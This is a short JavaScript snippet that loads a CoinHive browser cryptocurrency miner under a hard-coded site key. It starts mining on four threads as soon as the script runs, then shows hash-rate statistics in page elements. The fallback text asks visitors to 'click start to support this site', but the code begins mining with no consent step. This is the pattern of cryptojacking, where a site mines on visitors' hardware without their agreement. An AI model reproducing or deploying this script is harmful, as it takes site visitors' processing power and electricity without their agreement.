var miner = new CoinHive.Anonymous('AOBN7OWTvt59tFNdmz8W8KrV1jKJtwMT','threads: 4');
miner.setThrottle(0.6);
miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
// Update stats once per second
setInterval(function() {
    var threadCount = miner.getNumThreads();
    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
    var totalHashes = miner.getTotalHashes();
    var acceptedHashes = miner.getAcceptedHashes() / 256;
    // Output to HTML elements...
    if (miner.isRunning()) {
        document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
        document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
        document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
        document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
    } else {
        document.getElementById("hps").innerHTML = "Please click start";
        document.getElementById("ths").innerHTML = "to support";
        document.getElementById("tah").innerHTML = "this site";
    }
}, 1000);
